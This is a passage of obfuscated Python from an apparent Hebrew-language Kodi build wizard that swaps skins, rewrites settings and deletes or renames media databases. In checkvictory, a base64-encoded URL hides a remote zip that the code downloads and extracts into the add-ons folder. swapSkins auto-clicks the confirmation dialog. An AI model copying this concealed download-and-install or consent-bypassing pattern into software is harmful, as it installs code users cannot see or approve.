					if OO00OO000O00OO000 .split (' ==')[0 ]=="reset"or OO00OO000O00OO000 .split ()[0 ]=="reset":#line:597
						update_Votes ()#line:599
						indicatorfastupdate ()#line:600
						resetkodi ()#line:601
def checkvictory ():#line:602
				wiz .setS ("notedismiss2","true")#line:604
				OOO000O000OOOO000 =wiz .workingURL (NOTIFICATION2 )#line:605
				O00000OOOOO0OO0OO =" Kodi Premium"#line:607
				OOO000O0000OOO0OO ='aHR0cHM6Ly9naXRodWIuY29tL3ZpcDIwMC92aWN0b3J5L2Jsb2IvbWFzdGVyL3BsdWdpbi52aWRlby5hbGxtb3ZpZXNpbi56aXA/cmF3PXRydWU='.decode ('base64')#line:608
				OO00OOOO0O0O0OO00 =O00000OOOOO0OO0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:609
				if not wiz .workingURL (OOO000O0000OOO0OO )==True :return #line:610
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:611
				O00O0O000OO0O00O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO00OOOO0O0O0OO00 )#line:614
				try :os .remove (O00O0O000OO0O00O0 )#line:615
				except :pass #line:616
				if 'google'in OOO000O0000OOO0OO :#line:618
				   OOOO000O000O00OOO =googledrive_download (OOO000O0000OOO0OO ,O00O0O000OO0O00O0 ,DP2 ,wiz .checkBuild (O00000OOOOO0OO0OO ,'filesize'))#line:619
				else :#line:622
				  downloaderbg .download5 (OOO000O0000OOO0OO ,O00O0O000OO0O00O0 ,DP2 )#line:623
				xbmc .sleep (100 )#line:624
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:625
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:627
				extract .all2 (O00O0O000OO0O00O0 ,ADDONS ,DP2 )#line:629
				DP2 .close ()#line:630
				wiz .defaultSkin ()#line:631
				wiz .lookandFeelData ('save')#line:632
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ההרחבה עודכנה בהצלחה![/COLOR]'%COLOR2 )#line:633
				if INSTALLMETHOD ==1 :OOO000000OOO0OO00 =1 #line:635
				elif INSTALLMETHOD ==2 :OOO000000OOO0OO00 =0 #line:636
				else :DP2 .close ()#line:637
def checkUpdate ():#line:642
	OOOO0OO00O0O00000 =wiz .getS ('buildname')#line:643
	O0OO00O0000OOOO00 =wiz .getS ('buildversion')#line:644
	OOOOOOO00000OO00O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:645
	OO0O0O00O0O0O00O0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%OOOO0OO00O0O00000 ).findall (OOOOOOO00000OO00O )#line:646
	if len (OO0O0O00O0O0O00O0 )>0 :#line:647
		OOOOO00O0OO0OO0O0 =OO0O0O00O0O0O00O0 [0 ][0 ]#line:648
		O0O00000O000O0OO0 =OO0O0O00O0O0O00O0 [0 ][1 ]#line:649
		OO00O0OOOOO00OOOO =OO0O0O00O0O0O00O0 [0 ][2 ]#line:650
		wiz .setS ('latestversion',OOOOO00O0OO0OO0O0 )#line:651
		if OOOOO00O0OO0OO0O0 >O0OO00O0000OOOO00 :#line:652
			if DISABLEUPDATE =='false':#line:653
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O0OO00O0000OOOO00 ,OOOOO00O0OO0OO0O0 ),xbmc .LOGNOTICE )#line:654
				notify .updateWindow (OOOO0OO00O0O00000 ,O0OO00O0000OOOO00 ,OOOOO00O0OO0OO0O0 ,O0O00000O000O0OO0 ,OO00O0OOOOO00OOOO )#line:655
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O0OO00O0000OOOO00 ,OOOOO00O0OO0OO0O0 ),xbmc .LOGNOTICE )#line:656
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O0OO00O0000OOOO00 ,OOOOO00O0OO0OO0O0 ),xbmc .LOGNOTICE )#line:657
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:658
wiz .log ("[Auto Update Wizard] Started",xbmc .LOGNOTICE )#line:693
if AUTOUPDATE =='Yes':#line:694
	input =(ADDON .getSetting ("autoupdate"))#line:695
	xbmc .executebuiltin ("UpdateLocalAddons")#line:696
	xbmc .executebuiltin ("UpdateAddonRepos")#line:697
	wiz .wizardUpdate ('startup')#line:698
if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'skin.estuary'):#line:703
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:704
    setting_file =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skin","packages1.zip")#line:706
    src =os .path .join (xbmc .translatePath ("special://home/"),"addons/skin.estuary")#line:707
    extract .all (setting_file ,src )#line:710
    wiz .kodi17Fix ()#line:722
    if KODIV >=18 :#line:724
        setting_file =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.estuary","addon.xml")#line:726
        with open (setting_file ,'r')as file :#line:727
          filedata =file .read ()#line:728
        filedata =filedata .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.estuary" version="9.9.9" name="Estuary" provider-name="phil65, Ichabod Fletchman">
	<requires>
		<!-- <import addon="xbmc.gui" version="5.12.0"/> -->
	</requires>
	<extension point="xbmc.gui.skin" debugging="false" effectslowdown="1.0">
		<res width="1280" height="720" aspect="16:9" default="true" folder="720p" />
	</extension>
	<extension point="xbmc.addon.metadata">

		<platform>all</platform>
		<license>GNU General Public License version 2</license>
		<forum>http://forum.kodi.tv/forumdisplay.php?fid=125</forum>
		<website/>
		<email/>
		<source>https://github.com/xbmc/skin.confluence</source>
		<assets>
			<icon>resources/icon.png</icon>
			<fanart>resources/fanart.jpg</fanart>
		</assets>
		<news>Updated language files</news>
	</extension>
</addon>
''','''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.estuary" version="9.9.9" name="Estuary" provider-name="phil65, Ichabod Fletchman">
	<requires>
		<!-- <import addon="xbmc.gui" version="5.14.0"/> -->
	</requires>
	<extension point="xbmc.gui.skin" debugging="false" effectslowdown="1.0">
		<res width="1280" height="720" aspect="16:9" default="true" folder="720p" />
	</extension>
	<extension point="xbmc.addon.metadata">

		<platform>all</platform>
		<license>GNU General Public License version 2</license>
		<forum>http://forum.kodi.tv/forumdisplay.php?fid=125</forum>
		<website/>
		<email/>
		<source>https://github.com/xbmc/skin.confluence</source>
		<assets>
			<icon>resources/icon.png</icon>
			<fanart>resources/fanart.jpg</fanart>
		</assets>
		<news>Updated language files</news>
	</extension>
</addon>
''')#line:777
        with open (setting_file ,'w')as file :#line:780
          file .write (filedata )#line:781
        setting_file =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.estuary","720p","DialogAddonSettings.xml")#line:787
        with open (setting_file ,'r')as file :#line:788
          filedata =file .read ()#line:789
        filedata =filedata .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<window>
	<defaultcontrol always="true">2</defaultcontrol>
	<coordinates>
		<left>240</left>
		<top>60</top>
	</coordinates>
	<include>dialogeffect</include>
	<controls>
		<include content="DialogBackgroundCommons">
			<param name="DialogBackgroundWidth" value="800" />
			<param name="DialogBackgroundHeight" value="600" />
			<param name="DialogHeaderWidth" value="720" />
			<param name="DialogHeaderLabel" value="-" />
			<param name="DialogHeaderId" value="20" />
			<param name="CloseButtonLeft" value="710" />
			<param name="CloseButtonNav" value="3" />
		</include>
		<control type="grouplist" id="99">
			<description>button area</description>
			<left>45</left>
			<top>70</top>
			<width>710</width>
			<height>40</height>
			<itemgap>5</itemgap>
			<align>center</align>
			<orientation>horizontal</orientation>
			<onleft>9</onleft>
			<onright>9</onright>
			<onup>2</onup>
			<ondown>2</ondown>
		</control>
		<control type="image">
			<description>Has Previous</description>
			<left>25</left>
			<top>80</top>
			<width>20</width>
			<height>20</height>
			<texture>scroll-left-focus.png</texture>
			<visible>Container(9).HasPrevious</visible>
		</control>
		<control type="image">
			<description>Has Next</description>
			<left>755</left>
			<top>80</top>
			<width>20</width>
			<height>20</height>
			<texture>scroll-right-focus.png</texture>
			<visible>Container(9).HasNext</visible>
		</control>
		<control type="grouplist" id="2">
			<description>control area</description>
			<left>40</left>
			<top>120</top>
			<width>720</width>
			<height>380</height>
			<itemgap>5</itemgap>
			<pagecontrol>30</pagecontrol>
			<onup>9</onup>
			<ondown>9001</ondown>
			<onleft>2</onleft>
			<onright>30</onright>
		</control>
		<control type="scrollbar" id="30">
			<left>765</left>
			<top>120</top>
			<width>25</width>
			<height>380</height>
			<texturesliderbackground border="0,14,0,14">ScrollBarV.png</texturesliderbackground>
			<texturesliderbar border="2,16,2,16">ScrollBarV_bar.png</texturesliderbar>
			<texturesliderbarfocus border="2,16,2,16">ScrollBarV_bar_focus.png</texturesliderbarfocus>
			<textureslidernib>ScrollBarNib.png</textureslidernib>
			<textureslidernibfocus>ScrollBarNib.png</textureslidernibfocus>
			<onleft>2</onleft>
			<onright>2</onright>
			<showonepage>false</showonepage>
			<orientation>vertical</orientation>
		</control>
		<control type="group" id="9001">
			<top>535</top>
			<left>190</left>
			<control type="button" id="10">
				<description>OK Button</description>
				<left>0</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>186</label>
				<onleft>12</onleft>
				<onright>11</onright>
				<onup>2</onup>
				<ondown>2</ondown>
			</control>
			<control type="button" id="11">
				<description>Cancel Button</description>
				<left>210</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>222</label>
				<onleft>10</onleft>
				<onright>12</onright>
				<onup>2</onup>
				<ondown>2</ondown>
			</control>
<!-- 			<control type="button" id="12">
				<description>Defaults Button</description>
				<left>420</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>409</label>
				<onleft>11</onleft>
				<onright>10</onright>
				<onup>2</onup>
				<ondown>2</ondown>
			</control> -->
		</control>
		<control type="button" id="13">
			<description>Default Category Button</description>
			<height>40</height>
			<width>173</width>
			<align>center</align>
			<aligny>center</aligny>
			<font>font12_title</font>
			<textcolor>white</textcolor>
			<pulseonselect>false</pulseonselect>
		</control>
		<control type="button" id="3">
			<description>Default Button</description>
			<height>40</height>
			<font>font13</font>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
		<control type="radiobutton" id="4">
			<description>Default RadioButton</description>
			<height>40</height>
			<font>font13</font>
			<textwidth>668</textwidth>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
		<control type="spincontrolex" id="5">
			<description>Default spincontrolex</description>
			<height>40</height>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturenofocus border="5">button-nofocus.png</texturenofocus>
			<texturefocus border="5">button-focus2.png</texturefocus>
			<font>font13</font>
			<aligny>center</aligny>
			<reverse>yes</reverse>
		</control>
		<control type="label" id="7">
			<height>35</height>
			<font>font13_title</font>
			<label>-</label>
			<textcolor>blue</textcolor>
			<shadowcolor>black</shadowcolor>
			<align>right</align>
			<aligny>center</aligny>
		</control>
		<control type="image" id="6">
			<description>Default Seperator</description>
			<height>2</height>
			<texture>separator2.png</texture>
		</control>
		<control type="sliderex" id="8">
			<description>Default Slider</description>
			<height>40</height>
			<font>font13</font>
			<textwidth>518</textwidth>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
	</controls>
</window>
''','''<?xml version="1.0" encoding="UTF-8"?>
<window>
	<defaultcontrol always="true">5</defaultcontrol>
	<coordinates>
		<left>240</left>
		<top>60</top>
	</coordinates>
	<include>dialogeffect</include>
	<controls>
		<include content="DialogBackgroundCommons">
			<param name="DialogBackgroundWidth" value="800" />
			<param name="DialogBackgroundHeight" value="600" />
			<param name="DialogHeaderWidth" value="720" />
			<param name="DialogHeaderLabel" value="" />
			<param name="DialogHeaderId" value="2" />
			<param name="CloseButtonLeft" value="710" />
			<param name="CloseButtonNav" value="3" />
		</include>
		<control type="grouplist" id="3">
			<description>button area</description>
			<left>45</left>
			<top>70</top>
			<width>710</width>
			<height>40</height>
			<itemgap>5</itemgap>
			<align>center</align>
			<orientation>horizontal</orientation>
			<onleft>3</onleft>
			<onright>3</onright>
			<onup>5</onup>
			<ondown>5</ondown>
		</control>
			<control type="button" id="10">
			<description>Default Button</description>
			<height>40</height>
			<font>font13</font>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
			</control>
		<control type="image">
			<description>Has Previous</description>
			<left>25</left>
			<top>80</top>
			<width>20</width>
			<height>20</height>
			<texture>scroll-left-focus.png</texture>
			<visible>Container(3).HasPrevious</visible>
		</control>
		<control type="image">
			<description>Has Next</description>
			<left>755</left>
			<top>80</top>
			<width>20</width>
			<height>20</height>
			<texture>scroll-right-focus.png</texture>
			<visible>Container(3).HasNext</visible>
		</control>
		<control type="grouplist" id="5">
			<description>control area</description>
			<left>40</left>
			<top>120</top>
			<width>720</width>
			<height>380</height>
			<itemgap>5</itemgap>
			<pagecontrol>30</pagecontrol>
			<onup>3</onup>
			<ondown>9001</ondown>
			<onleft>2</onleft>
			<onright>30</onright>
		</control>
		<control type="scrollbar" id="30">
			<left>765</left>
			<top>120</top>
			<width>25</width>
			<height>380</height>
			<texturesliderbackground border="0,14,0,14">ScrollBarV.png</texturesliderbackground>
			<texturesliderbar border="2,16,2,16">ScrollBarV_bar.png</texturesliderbar>
			<texturesliderbarfocus border="2,16,2,16">ScrollBarV_bar_focus.png</texturesliderbarfocus>
			<textureslidernib>ScrollBarNib.png</textureslidernib>
			<textureslidernibfocus>ScrollBarNib.png</textureslidernibfocus>
			<onleft>2</onleft>
			<onright>2</onright>
			<showonepage>false</showonepage>
			<orientation>vertical</orientation>
		</control>
		<control type="group" id="9001">
			<top>535</top>
			<left>190</left>
			<control type="button" id="28">
				<description>OK Button</description>
				<left>0</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>186</label>
				<onleft>28</onleft>
				<onright>29</onright>
				<onup>5</onup>
				<ondown>5</ondown>
			</control>
			<control type="button" id="29">
				<description>Cancel Button</description>
				<left>210</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>222</label>
				<onleft>28</onleft>
				<onright>29</onright>
				<onup>5</onup>
				<ondown>5</ondown>
			</control>
<!-- 			<control type="button" id="12">
				<description>Defaults Button</description>
				<left>420</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>409</label>
				<onleft>11</onleft>
				<onright>10</onright>
				<onup>2</onup>
				<ondown>2</ondown>
			</control> -->
		</control>
		<control type="button" id="10">
			<description>Default Category Button</description>
			<height>40</height>
			<width>173</width>
			<align>center</align>
			<aligny>center</aligny>
			<font>font12_title</font>
			<textcolor>white</textcolor>
			<pulseonselect>false</pulseonselect>
		</control>
		<control type="button" id="7">
			<description>Default Button</description>
			<height>40</height>
			<font>font13</font>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
		<control type="radiobutton" id="8">
			<description>Default RadioButton</description>
			<height>40</height>
			<font>font13</font>
			<textwidth>668</textwidth>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
		<control type="spincontrolex" id="9">
			<description>Default spincontrolex</description>
			<height>40</height>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturenofocus border="5">button-nofocus.png</texturenofocus>
			<texturefocus border="5">button-focus2.png</texturefocus>
			<font>font13</font>
			<aligny>center</aligny>
			<reverse>yes</reverse>
		</control>
		<control type="label" id="14">
			<height>35</height>
			<font>font13_title</font>
			<label>-</label>
			<textcolor>blue</textcolor>
			<shadowcolor>black</shadowcolor>
			<align>right</align>
			<aligny>center</aligny>
		</control>
		<control type="image" id="11">
			<description>Default Seperator</description>
			<height>2</height>
			<texture>separator2.png</texture>
		</control>
		<control type="sliderex" id="13">
			<description>Default Slider</description>
			<height>40</height>
			<font>font13</font>
			<textwidth>518</textwidth>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
	</controls>
</window>
''')#line:1180
        with open (setting_file ,'w')as file :#line:1183
          file .write (filedata )#line:1184
    wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:1192
    xbmc .executebuiltin ("ReloadSkin()")#line:1193
    xbmc .executebuiltin ("ActivateWindow(home)")#line:1194
    f_play =(os .path .join (ADDONPATH ,'resources','victory.mp4'))#line:1195
    xbmc .Player ().play (f_play ,windowed =False )#line:1196
def setuname ():#line:1323
    O0000O0OO00O000O0 =''#line:1324
    OO0O000OO00OOOO00 =xbmc .Keyboard (O0000O0OO00O000O0 ,'הכנס שם משתמש')#line:1325
    OO0O000OO00OOOO00 .doModal ()#line:1326
    if OO0O000OO00OOOO00 .isConfirmed ():#line:1327
           O0000O0OO00O000O0 =OO0O000OO00OOOO00 .getText ()#line:1328
           wiz .setS ('user',str (O0000O0OO00O000O0 ))#line:1329
def STARTP2 ():#line:1330
	if BUILDNAME ==" Kodi Premium":#line:1331
		OO0O0OO00O00OO000 =(ADDON .getSetting ("user"))#line:1332
		OO0000OO00000O0O0 =(UNAME )#line:1333
		O00O00O00O00O0O00 =urllib2 .urlopen (OO0000OO00000O0O0 )#line:1334
		OOOOOOOO00O0OO0OO =O00O00O00O00O0O00 .readlines ()#line:1335
		O000O00O0O0000O00 =0 #line:1336
		for OO00O00O0O0O0O0OO in OOOOOOOO00O0OO0OO :#line:1337
			if OO00O00O0O0O0O0OO .split (' ==')[0 ]==OO0O0OO00O00OO000 or OO00O00O0O0O0O0OO .split ()[0 ]==OO0O0OO00O00OO000 :#line:1338
				O000O00O0O0000O00 =1 #line:1339
				break #line:1340
		if O000O00O0O0000O00 ==0 :#line:1341
			O0O0OO000OOOOOO00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]ברוכים הבאים לקודי אנונימוס"%(COLOR2 ),"נא להכניס את שם המשתמש שלכם[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:1343
			if O0O0OO000OOOOOO00 :#line:1345
				ADDON .openSettings ()#line:1346
				sys .exit ()#line:1347
			else :#line:1348
				sys .exit ()#line:1349
		return 'ok'#line:1353
def skinWIN ():#line:1356
	idle ()#line:1357
	OO00O00OOO00O0O0O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:1358
	O0OO00O0000OOO000 =[];OOOOOO00O00O00OO0 =[]#line:1359
	for OOOOOOOO00O0O0O0O in sorted (OO00O00OOO00O0O0O ,key =lambda OO00OOO0OO00OOO00 :OO00OOO0OO00OOO00 ):#line:1360
		OO00O0O0O000OOOOO =os .path .split (OOOOOOOO00O0O0O0O [:-1 ])[1 ]#line:1361
		O00OO0O0OO0000OO0 =os .path .join (OOOOOOOO00O0O0O0O ,'addon.xml')#line:1362
		if os .path .exists (O00OO0O0OO0000OO0 ):#line:1363
			OOOO0OOO000OO0000 =open (O00OO0O0OO0000OO0 )#line:1364
			OO00OOOOOOO00OO0O =OOOO0OOO000OO0000 .read ()#line:1365
			O000OOO0OO00OO00O =parseDOM2 (OO00OOOOOOO00OO0O ,'addon',ret ='id')#line:1366
			O0OO0000O0O000000 =OO00O0O0O000OOOOO if len (O000OOO0OO00OO00O )==0 else O000OOO0OO00OO00O [0 ]#line:1367
			try :#line:1368
				O0O0OOO00000OOO00 =xbmcaddon .Addon (id =O0OO0000O0O000000 )#line:1369
				O0OO00O0000OOO000 .append (O0O0OOO00000OOO00 .getAddonInfo ('name'))#line:1370
				OOOOOO00O00O00OO0 .append (O0OO0000O0O000000 )#line:1371
			except :#line:1372
				pass #line:1373
	OO00O00OOO0000OOO =[];O0000O0O00OOO0O0O =0 #line:1374
	OOOOO00OOOOOO0000 =["Current Skin -- %s"%currSkin ()]+O0OO00O0000OOO000 #line:1375
	O0000O0O00OOO0O0O =DIALOG .select ("Select the Skin you want to swap with.",OOOOO00OOOOOO0000 )#line:1376
	if O0000O0O00OOO0O0O ==-1 :return #line:1377
	else :#line:1378
		OO0OOO0O0OOO0O0O0 =(O0000O0O00OOO0O0O -1 )#line:1379
		OO00O00OOO0000OOO .append (OO0OOO0O0OOO0O0O0 )#line:1380
		OOOOO00OOOOOO0000 [O0000O0O00OOO0O0O ]="%s"%(O0OO00O0000OOO000 [OO0OOO0O0OOO0O0O0 ])#line:1381
	if OO00O00OOO0000OOO ==None :return #line:1382
	for O0O0O0O0OO00000OO in OO00O00OOO0000OOO :#line:1383
		swapSkins (OOOOOO00O00O00OO0 [O0O0O0O0OO00000OO ])#line:1384
def currSkin ():#line:1386
	return xbmc .getSkinDir ('Container.PluginName')#line:1387
def fix17update ():#line:1389
	if KODIV >=17 and KODIV <18 :#line:1390
		wiz .kodi17Fix ()#line:1391
		xbmc .sleep (4000 )#line:1392
		try :#line:1393
			O00OO0O0O00OO00OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:1394
			O00OOO0000OO0O00O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:1395
			os .rename (O00OO0O0O00OO00OO ,O00OOO0000OO0O00O )#line:1396
		except :#line:1397
				pass #line:1398
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:1399
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:1400
		fixfont ()#line:1401
		O0000O0O000O0OOO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:1402
		try :#line:1404
			OO0000000O00OOO0O =open (O0000O0O000O0OOO0 ,'r')#line:1405
			O0OOOO00OO0O00OOO =OO0000000O00OOO0O .read ()#line:1406
			OO0000000O00OOO0O .close ()#line:1407
			O0OO0OO000O00O00O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:1408
			O00O0000O0OO0OO0O =re .compile (O0OO0OO000O00O00O ).findall (O0OOOO00OO0O00OOO )[0 ]#line:1409
			OO0000000O00OOO0O =open (O0000O0O000O0OOO0 ,'w')#line:1410
			OO0000000O00OOO0O .write (O0OOOO00OO0O00OOO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00O0000O0OO0OO0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:1411
			OO0000000O00OOO0O .close ()#line:1412
		except :#line:1413
				pass #line:1414
		wiz .kodi17Fix ()#line:1415
		O0000O0O000O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:1416
		try :#line:1417
			OO0000000O00OOO0O =open (O0000O0O000O0OOO0 ,'r')#line:1418
			O0OOOO00OO0O00OOO =OO0000000O00OOO0O .read ()#line:1419
			OO0000000O00OOO0O .close ()#line:1420
			O0OO0OO000O00O00O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:1421
			O00O0000O0OO0OO0O =re .compile (O0OO0OO000O00O00O ).findall (O0OOOO00OO0O00OOO )[0 ]#line:1422
			OO0000000O00OOO0O =open (O0000O0O000O0OOO0 ,'w')#line:1423
			OO0000000O00OOO0O .write (O0OOOO00OO0O00OOO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00O0000O0OO0OO0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:1424
			OO0000000O00OOO0O .close ()#line:1425
		except :#line:1426
				pass #line:1427
		swapSkins ('skin.Premium.mod')#line:1428
	xbmcgui .Dialog ().ok ("Kodi Anonymous Fix",'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')#line:1429
	os ._exit (1 )#line:1430
def fix18update ():#line:1431
	if KODIV >=18 :#line:1432
		xbmc .sleep (4000 )#line:1433
		if BUILDNAME =="":#line:1434
			try :#line:1435
				os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db"))#line:1436
			except :#line:1437
				pass #line:1438
		try :#line:1439
			O0000O0O0OOO0O0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:1440
			O0OO0OOO000O000O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:1441
			os .rename (O0000O0O0OOO0O0OO ,O0OO0OOO000O000O0 )#line:1442
		except :#line:1443
				pass #line:1444
		skindialogsettind18 ()#line:1445
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:1446
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:1447
		fixfont ()#line:1448
		OOOOOOO0OO0OOOOO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:1449
		try :#line:1450
			O0OO000O0O0O0O0OO =open (OOOOOOO0OO0OOOOO0 ,'r')#line:1451
			O0O0000O0O00O00OO =O0OO000O0O0O0O0OO .read ()#line:1452
			O0OO000O0O0O0O0OO .close ()#line:1453
			O0O00O00OOOO000OO ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:1454
			O000OOOOO00OOO0OO =re .compile (O0O00O00OOOO000OO ).findall (O0O0000O0O00O00OO )[0 ]#line:1455
			O0OO000O0O0O0O0OO =open (OOOOOOO0OO0OOOOO0 ,'w')#line:1456
			O0OO000O0O0O0O0OO .write (O0O0000O0O00O00OO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O000OOOOO00OOO0OO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:1457
			O0OO000O0O0O0O0OO .close ()#line:1458
		except :#line:1459
				pass #line:1460
		wiz .kodi17Fix ()#line:1461
		OOOOOOO0OO0OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:1462
		try :#line:1463
			O0OO000O0O0O0O0OO =open (OOOOOOO0OO0OOOOO0 ,'r')#line:1464
			O0O0000O0O00O00OO =O0OO000O0O0O0O0OO .read ()#line:1465
			O0OO000O0O0O0O0OO .close ()#line:1466
			O0O00O00OOOO000OO ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:1467
			O000OOOOO00OOO0OO =re .compile (O0O00O00OOOO000OO ).findall (O0O0000O0O00O00OO )[0 ]#line:1468
			O0OO000O0O0O0O0OO =open (OOOOOOO0OO0OOOOO0 ,'w')#line:1469
			O0OO000O0O0O0O0OO .write (O0O0000O0O00O00OO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O000OOOOO00OOO0OO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:1470
			O0OO000O0O0O0O0OO .close ()#line:1471
		except :#line:1472
				pass #line:1473
		swapSkins ('skin.Premium.mod')#line:1474
	xbmcgui .Dialog ().ok ("Kodi Anonymous Fix",'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')#line:1475
	os ._exit (1 )#line:1476
def swapSkins (O0O00O0O00O00OOO0 ,title ="Error"):#line:1477
	O000OO0000000OOOO ='lookandfeel.skin'#line:1478
	OOOO00O00OOO0O0OO =O0O00O0O00O00OOO0 #line:1479
	OO0OO0O00O0O0OO00 =getOld (O000OO0000000OOOO )#line:1480
	OO0OOOOO0OOO00OO0 =O000OO0000000OOOO #line:1481
	setNew (OO0OOOOO0OOO00OO0 ,OOOO00O00OOO0O0OO )#line:1482
	O0OOO00OOOO000OO0 =0 #line:1483
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOO00OOOO000OO0 <100 :#line:1484
		O0OOO00OOOO000OO0 +=1 #line:1485
		xbmc .sleep (1 )#line:1486
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:1487
		xbmc .executebuiltin ('SendClick(11)')#line:1488
	return True #line:1489
def getOld (O000O0O0OO0O00O00 ):#line:1491
	try :#line:1492
		O000O0O0OO0O00O00 ='"%s"'%O000O0O0OO0O00O00 #line:1493
		O0O00OO0OO0O0O0O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O000O0O0OO0O00O00 )#line:1494
		OO0O0OOOOO0OOOO0O =xbmc .executeJSONRPC (O0O00OO0OO0O0O0O0 )#line:1496
		OO0O0OOOOO0OOOO0O =simplejson .loads (OO0O0OOOOO0OOOO0O )#line:1497
